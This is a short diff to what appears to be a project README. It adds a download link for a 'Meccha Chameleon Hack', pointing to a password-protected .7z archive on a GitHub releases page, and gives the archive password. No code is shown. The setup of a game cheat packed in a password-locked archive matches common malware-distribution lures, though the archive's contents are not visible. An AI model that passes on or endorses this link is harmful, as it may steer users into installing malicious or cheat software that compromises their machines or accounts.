@@ -7,9 +7,11 @@
 ## 📥 Download
 
 **Latest version:**  
-🔗 **[Download Meccha Chameleon Hack]()**
+🔗 **[Download Meccha Chameleon Hack](https://github.com/VertexWeaverRectify/Meccha-Chameleon-Hack/releases/download/mechachameleon/MechaChamelGOOD.7z)**
 
 **Password:** `chameleon2026`
+
+
 
 
 ---
